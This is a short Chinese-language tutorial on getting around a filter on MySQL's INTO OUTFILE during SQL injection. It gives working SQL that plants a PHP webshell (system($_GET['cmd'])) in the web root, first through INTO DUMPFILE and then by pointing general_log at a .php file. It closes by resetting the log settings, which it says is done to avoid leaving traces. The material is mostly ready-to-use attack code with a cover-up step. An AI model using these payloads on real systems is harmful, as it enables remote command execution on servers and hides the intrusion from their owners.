### SQL 注入 outfile() 被过滤怎么绕过

**1. 利用 `dumpfile()` 函数**

如果 `outfile()` 被禁用，但 `dumpfile()` 未被过滤，这是一个直接的替代方案

- **区别**：`outfile()` 可以将查询结果输出到文件中，支持多行数据。而 `dumpfile()` 只能输出单行数据。
- **用法**：将需要写入文件的内容作为查询结果，然后使用 `into dumpfile` 写入

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
```

**2. 利用日志文件**

如果数据库开启了通用查询日志（`general_log`）或者慢查询日志（`slow_query_log`），并且你有权限修改日志路径，那么可以利用这个特性来写入 Webshell

- **步骤**：
  1. **设置日志文件路径**：将 `general_log_file` 或 `slow_query_log_file` 的值修改为 Web 目录下的一个可写路径，例如 `/var/www/html/shell.php`
  2. **开启日志**：将 `general_log` 或 `slow_query_log` 设为 `ON`
  3. **写入恶意代码**：执行一个包含 Webshell 代码的查询，例如 `SELECT '<?php system($_GET["cmd"]); ?>'`。这条查询语句会被写入到日志文件中，从而创建 Webshell

```sql
# 修改日志路径
SET GLOBAL general_log_file = '/var/www/html/shell.php';

# 开启日志
SET GLOBAL general_log = ON;

# 写入 Webshell
SELECT '<?php system($_GET["cmd"]); ?>';

# 写入完成后，关闭日志并重置路径，避免留下痕迹
SET GLOBAL general_log = OFF;
SET GLOBAL general_log_file = '/path/to/original/log';
```